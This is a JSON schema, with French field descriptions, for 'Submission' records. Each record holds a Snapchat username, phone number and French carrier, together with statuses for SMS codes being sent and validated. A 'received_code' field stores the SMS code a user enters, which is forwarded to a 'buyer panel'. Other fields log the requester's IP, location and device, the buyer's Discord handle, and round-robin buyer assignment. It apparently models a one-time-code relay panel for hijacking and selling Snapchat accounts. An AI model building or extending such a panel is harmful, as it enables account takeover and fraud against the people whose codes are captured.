{
  "name": "Submission",
  "type": "object",
  "properties": {
    "snapchat": {
      "type": "string",
      "description": "Pseudo Snapchat de l'utilisateur"
    },
    "telephone": {
      "type": "string",
      "description": "Num\u00e9ro de t\u00e9l\u00e9phone"
    },
    "operateur": {
      "type": "string",
      "enum": [
        "SFR",
        "Bouygues",
        "Orange"
      ],
      "description": "Op\u00e9rateur t\u00e9l\u00e9phonique"
    },
    "status": {
      "type": "string",
      "enum": [
        "pending",
        "code_ready",
        "code6_ready",
        "code6sfr_ready",
        "code6orange_ready",
        "code_valid",
        "code_wrong",
        "code_expired",
        "waiting_queue"
      ],
      "default": "pending",
      "description": "Statut de la demande"
    },
    "code_sent_at": {
      "type": "string",
      "format": "date-time",
      "description": "Timestamp d'envoi du code"
    },
    "received_code": {
      "type": "string",
      "description": "Dernier code SMS saisi par l'utilisateur (re\u00e7u dans le panneau acheteur)"
    },
    "code_received_at": {
      "type": "string",
      "format": "date-time",
      "description": "Timestamp de r\u00e9ception du code"
    },
    "ip_address": {
      "type": "string",
      "description": "Adresse IP du demandeur"
    },
    "country": {
      "type": "string",
      "description": "Pays d\u00e9tect\u00e9 par g\u00e9olocalisation"
    },
    "browser": {
      "type": "string",
      "description": "Navigateur utilis\u00e9"
    },
    "device_type": {
      "type": "string",
      "enum": [
        "phone",
        "tablet",
        "desktop"
      ],
      "description": "Type d'appareil"
    },
    "admin_ip": {
      "type": "string",
      "description": "IP de l'admin/acheteur qui a verrouill\u00e9 la demande (premier envoi de code)"
    },
    "admin_discord": {
      "type": "string",
      "description": "Pseudo Discord/acheteur qui a verrouill\u00e9 la demande"
    },
    "assigned_buyer_id": {
      "type": "string",
      "description": "ID de l'acheteur assign\u00e9 par rotation round-robin"
    },
    "claimed_by": {
      "type": "string",
      "description": "ID de l'acheteur qui a r\u00e9clam\u00e9 la demande"
    }
  },
  "required": [
    "snapchat",
    "telephone",
    "operateur"
  ]
}